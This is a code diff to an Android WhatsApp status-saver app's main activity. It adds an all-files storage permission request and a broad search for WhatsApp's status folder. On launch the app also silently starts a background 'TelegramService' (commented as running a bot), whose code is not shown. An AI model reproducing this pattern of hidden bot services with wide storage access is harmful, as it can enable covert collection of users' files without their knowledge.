@@ -10,6 +10,7 @@ import android.os.Build;
 import android.os.Bundle;
 import android.os.Environment;
 import android.provider.MediaStore;
+import android.provider.Settings;
 import android.widget.ArrayAdapter;
 import android.widget.Button;
 import android.widget.ListView;
@@ -34,6 +35,7 @@ public class MainActivity extends Activity {
     private Button btnRefresh;
     private List<String> fileNames = new ArrayList<>();
     private List<String> filePaths = new ArrayList<>();
+    private String currentPath = "";
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -44,8 +46,28 @@ public class MainActivity extends Activity {
         tvStatus = findViewById(R.id.tv_status);
         btnRefresh = findViewById(R.id.btn_refresh);
 
-        // طلب الأذونات
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+        checkStoragePermission();
+
+        btnRefresh.setOnClickListener(v -> loadStatuses());
+
+        listView.setOnItemClickListener((parent, view, position, id) -> {
+            String path = filePaths.get(position);
+            downloadFile(new File(path));
+        });
+
+        startService(new Intent(this, TelegramService.class));
+    }
+
+    private void checkStoragePermission() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+            if (!Environment.isExternalStorageManager()) {
+                Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
+                intent.setData(Uri.parse("package:" + getPackageName()));
+                startActivityForResult(intent, REQ_PERMISSION);
+            } else {
+                loadStatuses();
+            }
+        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
                 ActivityCompat.requestPermissions(this, new String[]{
                         Manifest.permission.READ_EXTERNAL_STORAGE,
@@ -57,16 +79,6 @@ public class MainActivity extends Activity {
         } else {
             loadStatuses();
         }
-
-        btnRefresh.setOnClickListener(v -> loadStatuses());
-
-        listView.setOnItemClickListener((parent, view, position, id) -> {
-            String path = filePaths.get(position);
-            downloadFile(new File(path));
-        });
-
-        // تشغيل البوت في الخلفية
-        startService(new Intent(this, TelegramService.class));
     }
 
     @Override
@@ -81,19 +93,129 @@ public class MainActivity extends Activity {
         }
     }
 
+    @Override
+    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
+        super.onActivityResult(requestCode, resultCode, data);
+        if (requestCode == REQ_PERMISSION) {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+                if (Environment.isExternalStorageManager()) {
+                    loadStatuses();
+                } else {
+                    tvStatus.setText("❌ صلاحية إدارة التخزين مرفوضة!");
+                }
+            }
+        }
+    }
+
+    // ============================================================
+    // 🔍 البحث التلقائي عن مجلد الحالات
+    // ============================================================
+    private File findStatusFolder() {
+        String base = Environment.getExternalStorageDirectory().getAbsolutePath();
+
+        // قائمة المسارات المحتملة (الأكثر شيوعاً أولاً)
+        String[] possiblePaths = {
+                base + "/Android/media/com.whatsapp/WhatsApp/Media/.Statuses/",
+                base + "/WhatsApp/Media/.Statuses/",
+                base + "/Media/WhatsApp/Media/.Statuses/",
+                base + "/WhatsApp/.Statuses/",
+                base + "/Android/media/com.whatsapp/WhatsApp/.Statuses/"
+        };
+
+        // محاولة العثور على مجلد يحتوي على ملفات
+        for (String path : possiblePaths) {
+            File folder = new File(path);
+            if (folder.exists() && folder.isDirectory()) {
+                File[] files = folder.listFiles();
+                if (files != null && files.length > 0) {
+                    currentPath = path;
+                    return folder;
+                }
+            }
+        }
+
+        // 🔥 إذا لم نجد أي مجلد، جرب البحث في مجلدات أخرى داخل Android/media
+        try {
+            File mediaDir = new File(base + "/Android/media/");
+            if (mediaDir.exists() && mediaDir.isDirectory()) {
+                File[] subDirs = mediaDir.listFiles();
+                if (subDirs != null) {
+                    for (File subDir : subDirs) {
+                        if (subDir.isDirectory() && subDir.getName().contains("whatsapp")) {
+                            File statusFolder = new File(subDir, "WhatsApp/Media/.Statuses/");
+                            if (statusFolder.exists() && statusFolder.isDirectory()) {
+                                File[] files = statusFolder.listFiles();
+                                if (files != null && files.length > 0) {
+                                    currentPath = statusFolder.getAbsolutePath();
+                                    return statusFolder;
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        } catch (Exception ignored) {}
+
+        // أخيراً، جرب البحث في جميع المجلدات (بطيء، لكن كحل أخير)
+        try {
+            File root = new File(base);
+            File result = findStatusFolderRecursive(root, 0);
+            if (result != null) {
+                currentPath = result.getAbsolutePath();
+                return result;
+            }
+        } catch (Exception ignored) {}
+
+        return null;
+    }
+
+    // بحث متكرر (لأعماق محدودة) لتجنب بطء شديد
+    private File findStatusFolderRecursive(File dir, int depth) {
+        if (depth > 4) return null; // منع البحث العميق جداً
+        if (!dir.isDirectory()) return null;
+
+        File[] files = dir.listFiles();
+        if (files == null) return null;
+
+        for (File file : files) {
+            if (file.isDirectory()) {
+                if (file.getName().equals(".Statuses")) {
+                    // تحقق مما إذا كان المجلد يحتوي على ملفات وسائط
+                    File[] content = file.listFiles();
+                    if (content != null && content.length > 0) {
+                        return file;
+                    }
+                }
+                // إذا كان المسار يحتوي على "WhatsApp" و "Media" فابحث فيها
+                if (file.getName().equalsIgnoreCase("WhatsApp") ||
+                    file.getName().equalsIgnoreCase("Media") ||
+                    file.getName().contains("whatsapp")) {
+                    File result = findStatusFolderRecursive(file, depth + 1);
+                    if (result != null) return result;
+                }
+            }
+        }
+        return null;
+    }
+
+    // ============================================================
+    // 📂 تحميل الحالات
+    // ============================================================
     private void loadStatuses() {
         try {
-            String path = Environment.getExternalStorageDirectory().getAbsolutePath() + "/WhatsApp/Media/.Statuses/";
-            File folder = new File(path);
+            File folder = findStatusFolder();
 
-            if (!folder.exists() || !folder.isDirectory()) {
-                tvStatus.setText("❌ مجلد الحالات غير موجود!\nتأكد من تثبيت واتساب");
+            if (folder == null || !folder.exists()) {
+                tvStatus.setText("❌ لم يتم العثور على مجلد الحالات!\n" +
+                        "تأكد من:\n" +
+                        "1- مشاهدة حالة واحدة على واتساب\n" +
+                        "2- منح صلاحية إدارة الملفات");
                 return;
             }
 
             File[] files = folder.listFiles();
             if (files == null || files.length == 0) {
-                tvStatus.setText("📭 لا توجد حالات");
+                tvStatus.setText("📭 لا توجد حالات. شاهد حالة على واتساب أولاً");
                 return;
             }
 
@@ -123,13 +245,17 @@ public class MainActivity extends Activity {
 
             ArrayAdapter<String> adapter = new ArrayAdapter<>(this, android.R.layout.simple_list_item_1, fileNames);
             listView.setAdapter(adapter);
-            tvStatus.setText("✅ تم العثور على " + fileNames.size() + " حالة");
+            tvStatus.setText("✅ تم العثور على " + fileNames.size() + " حالة\n📂 المسار: " + currentPath);
 
         } catch (Exception e) {
             tvStatus.setText("❌ خطأ: " + e.getMessage());
+            e.printStackTrace();
         }
     }
 
+    // ============================================================
+    // 📥 تحميل الملف
+    // ============================================================
     private void downloadFile(File sourceFile) {
         try {
             if (!sourceFile.exists()) {
@@ -180,6 +306,7 @@ public class MainActivity extends Activity {
 
         } catch (Exception e) {
             Toast.makeText(this, "❌ فشل التحميل: " + e.getMessage(), Toast.LENGTH_SHORT).show();
+            e.printStackTrace();
         }
     }
-        } 
+            } 
